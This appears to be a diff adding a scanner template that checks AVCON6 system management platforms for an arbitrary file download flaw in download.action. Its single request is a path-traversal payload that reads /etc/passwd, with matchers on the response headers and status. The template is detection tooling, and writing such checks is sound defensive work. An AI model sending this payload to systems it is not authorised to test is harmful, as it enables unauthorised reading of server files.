@@ -1,0 +1,24 @@
+id: avcon6-lfi
+brief:
+    title: AVCON6 - Arbitrary File Download
+    by: DhiyaneshDk
+    level: high
+    about: File Download vulnerability in the download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server
+    label:
+        - avcon6
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/download.action?filename=../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - application/octet-stream
+            - filename=
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
